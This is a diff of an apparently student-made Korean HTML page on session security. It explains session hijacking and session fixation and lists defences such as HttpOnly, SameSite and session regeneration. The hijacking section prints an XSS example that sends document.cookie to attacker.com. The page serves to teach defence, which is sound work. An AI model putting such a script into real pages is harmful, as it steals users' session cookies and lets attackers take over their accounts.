@@ -1,121 +1,147 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ko">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Session 설명</title>
-    <link rel="stylesheet" href="styles.css" />
+    <title>웹프로그래밍 - 팀 프로젝트</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;600;700&display=swap"
+      rel="stylesheet"
+    />
     <link rel="stylesheet" href="session_style.css" />
   </head>
-
   <body>
-    <header>
-      <nav class="navbar">
-        <div class="logo">세션 개념 설명</div>
-        <ul class="nav-links">
-          <li><a href="#what">세션이란?</a></li>
-          <li><a href="#how">작동 원리</a></li>
-          <li><a href="#code">코드 예시</a></li>
-          <li><a href="#security">보안 이슈</a></li>
-          <li><a href="index.html">홈</a></li>
-        </ul>
-      </nav>
-    </header>
-
-    <section class="hero">
-      <h1>세션(Session) 이해하기</h1>
-      <p>웹 서비스에서의 사용자 상태 유지 메커니즘을 상세하게 알아보자</p>
-      <button onclick="scrollToSection('what')">시작하기</button>
-    </section>
-
-    <section id="what" class="content-section">
-      <h2>세션(Session)이란?</h2>
+    <nav class="bg-gray-800 text-white p-4 sticky top-0 z-50">
+      <div class="container mx-auto flex justify-between items-center">
+        <h1 class="text-2xl font-bold">세션</h1>
+        <ul class="flex space-x-6">
+          <li>
+            <a href="/index.html" class="hover:text-indigo-300 transition">홈</a>
+          </li>
+        </nav>
+    <section class="content-section" id="session-security">
+      <h2>세션 관련 보안 위협</h2>
       <p>
-        세션은
-        <span class="highlight">HTTP가 상태 비저장(stateless) 프로토콜</span
-        >이기 때문에, 사용자의 로그인 상태나 장바구니 정보와 같은 상태를
-        유지하기 위해 사용됩니다. 세션은 서버에 저장되며, 클라이언트는
-        일반적으로 <strong>세션 ID</strong>만을 쿠키로 보관합니다.
+        세션(Session)은 사용자의 로그인 상태를 유지하고 서버 측에서 사용자
+        정보를 식별하는 데 사용되는 중요한 기술입니다. 하지만 세션 ID가
+        탈취되거나 조작되는 경우, 공격자는 사용자를 가장하여 시스템에 불법적으로
+        접근할 수 있습니다. 이로 인해 발생할 수 있는 대표적인 공격 기법은 다음과
+        같습니다.
       </p>
-    </section>
 
-    <section id="how" class="content-section">
-      <h2>세션 작동 원리</h2>
-      <ol>
-        <li>클라이언트가 로그인 정보를 서버에 전송합니다.</li>
-        <li>
-          서버는 사용자 인증이 완료되면 고유한 <strong>세션 ID</strong>를
-          생성합니다.
-        </li>
-        <li>
-          세션 ID와 함께 서버에 사용자 정보를 저장합니다 (예: 메모리, DB).
-        </li>
-        <li>
-          세션 ID는 <span class="highlight">Set-Cookie</span> 헤더를 통해
-          브라우저에 전달됩니다.
-        </li>
-        <li>클라이언트는 이후 모든 요청에 이 세션 ID를 자동으로 포함합니다.</li>
-        <li>서버는 해당 ID를 바탕으로 사용자 상태를 확인합니다.</li>
-      </ol>
-    </section>
+      <div class="security-card">
+        <h3>1. 세션 하이재킹 (Session Hijacking)</h3>
+        <p>
+          세션 하이재킹은 공격자가 사용자와 서버 간에 생성된
+          <span class="highlight">세션 식별자(Session ID)</span>를 탈취하여,
+          사용자의 권한으로 서버에 접근하는 공격입니다. 주로 네트워크를
+          감청하거나 XSS를 이용해 클라이언트 측 쿠키를 훔쳐 세션을 탈취합니다.
+        </p>
+        <div class="info-box">
+          네트워크에서 암호화되지 않은 HTTP 요청을 가로채거나, 사용자의
+          브라우저에 악성 스크립트를 삽입하여 <code>document.cookie</code>를
+          수집하는 것이 일반적인 수단입니다.
+        </div>
+        <div class="code-box">
+          // XSS를 이용한 세션 쿠키 탈취 예제<br />
+          &lt;script&gt;<br />
+          &nbsp;&nbsp;fetch("http://attacker.com/log?c=" + document.cookie);<br />
+          &lt;/script&gt;
+        </div>
+        <ul>
+          <li>
+            모든 페이지 요청에 <span class="highlight">HTTPS</span>를 강제
+            적용하여 네트워크 감청을 방지
+          </li>
+          <li>
+            세션 쿠키에 <code>HttpOnly</code> 속성을 설정해
+            <span class="highlight">JavaScript 접근 차단</span>
+          </li>
+          <li>
+            Cross-site scripting(XSS)을 방지하기 위해 입력값을 철저히 필터링하고
+            <code>Content-Security-Policy</code> 설정 적용
+          </li>
+          <li>
+            동시 로그인 제어 및 세션 사용기록 기록(최근 접속 IP, 브라우저 정보
+            등)을 통한 이상 탐지
+          </li>
+        </ul>
+      </div>
 
-    <section id="code" class="content-section">
-      <h2>세션 처리 코드 예시 (Express.js)</h2>
-      <div class="code-box">
-        const express = require('express');<br />
-        const session = require('express-session');<br />
-        const app = express();<br /><br />
+      <div class="security-card">
+        <h3>2. 세션 고정 공격 (Session Fixation)</h3>
+        <p>
+          세션 고정(Session Fixation)은 공격자가 미리 생성한 세션 ID를
+          사용자에게 강제로 부여하고, 사용자가 로그인한 뒤 그 세션을 탈취하는
+          방식입니다. 서버가 로그인 이후에도 세션 ID를 유지하는 경우 매우
+          치명적입니다.
+        </p>
+        <div class="info-box">
+          예: 공격자가 다음과 같은 URL을 이메일로 보냅니다 →<br />
+          <code>https://example.com/login?sessionid=abcd1234</code><br />
+          피해자가 해당 링크로 접속하고 로그인하면, 공격자는 미리 알고 있던 세션
+          ID로 사용자가 인증된 상태로 접근할 수 있습니다.
+        </div>
+        <div class="code-box">
+          // Express.js에서 로그인 시 세션 재생성<br />
+          req.session.regenerate(function(err) {<br />
+          &nbsp;&nbsp;if (!err) {<br />
+          &nbsp;&nbsp;&nbsp;&nbsp;// 안전하게 로그인 처리<br />
+          &nbsp;&nbsp;}<br />
+          });
+        </div>
+        <ul>
+          <li>
+            사용자가 로그인할 때
+            <span class="highlight"
+              >기존 세션을 파기하고 새로운 세션 ID를 발급</span
+            >해야 합니다
+          </li>
+          <li>
+            세션 ID는
+            <span class="highlight"
+              >절대로 URL 파라미터에 포함해서는 안 됩니다</span
+            >
+          </li>
+          <li>
+            쿠키에 <code>SameSite=Strict</code> 또는 <code>Lax</code> 속성을
+            설정해 CSRF로부터 보호
+          </li>
+          <li>
+            서버 측에서 세션 생성 시 인증 전과 후의 세션 ID를 항상 비교하여 관리
+          </li>
+        </ul>
+      </div>
 
-        app.use(session({<br />
-        secret: 'mySecretKey',<br />
-        resave: false,<br />
-        saveUninitialized: true,<br />
-        cookie: { secure: false }<br />
-        }));<br /><br />
-
-        app.get('/', (req, res) => {<br />
-        if (req.session.views) {<br />
-        req.session.views++<br />
-        res.send(`Views: ${req.session.views}`);<br />
-        } else {<br />
-        req.session.views = 1;<br />
-        res.send('첫 방문입니다.');<br />
-        }<br />
-        });
+      <div class="security-card">
+        <h3>3. 세션 탈취 대응 전략</h3>
+        <p>안전한 세션 관리를 위해 다음과 같은 보안 수칙을 준수해야 합니다.</p>
+        <ul>
+          <li>모든 통신에 <span class="highlight">HTTPS</span> 적용</li>
+          <li>
+            쿠키에 <code>HttpOnly</code>, <code>Secure</code>,
+            <code>SameSite</code> 속성 적용
+          </li>
+          <li>로그인 시 <span class="highlight">세션 ID 재생성</span></li>
+          <li>세션 타임아웃 및 사용자 활동 기반 만료 설정</li>
+          <li>의심스러운 행동 탐지를 위한 사용자 에이전트, IP 모니터링</li>
+          <li><span class="highlight">이중 인증(2FA)</span> 도입</li>
+        </ul>
+        <div class="code-box">
+          // 세션 타임아웃 설정 예시<br />
+          app.use(session({<br />
+          &nbsp;&nbsp;secret: 'secretKey',<br />
+          &nbsp;&nbsp;cookie: { maxAge: 15 * 60 * 1000 }, // 15분<br />
+          &nbsp;&nbsp;resave: false,<br />
+          &nbsp;&nbsp;saveUninitialized: true<br />
+          }));
+        </div>
       </div>
     </section>
-
-    <section id="security" class="content-section">
-      <h2>세션 관련 보안 이슈</h2>
-      <ul>
-        <li>
-          <strong>세션 하이재킹(Session Hijacking):</strong> 공격자가
-          <span class="highlight">세션 ID를 탈취</span>하여 사용자로 가장
-        </li>
-        <li>
-          <strong>세션 고정(Session Fixation):</strong> 세션 ID를 미리 할당하여
-          피해자에게 사용하게 함
-        </li>
-        <li>
-          <strong>보안 대책:</strong>
-          <ul>
-            <li>HTTPS 사용으로 세션 ID 탈취 방지</li>
-            <li>로그인 시 세션 ID 재생성</li>
-            <li>HttpOnly, Secure 속성 사용</li>
-            <li>짧은 세션 유효 시간 설정</li>
-          </ul>
-        </li>
-      </ul>
-    </section>
-
-    <footer>
-      <p>&copy; 2025 웹프로그래밍 2조.</p>
+    <footer class="footer">
+      <p>© 2025 웹프로그래밍 2조. 모든 권리 보유.</p>
     </footer>
-
-    <script>
-      function scrollToSection(id) {
-        document.getElementById(id).scrollIntoView({ behavior: "smooth" });
-      }
-    </script>
+    <script src="main.js"></script>
   </body>
 </html>
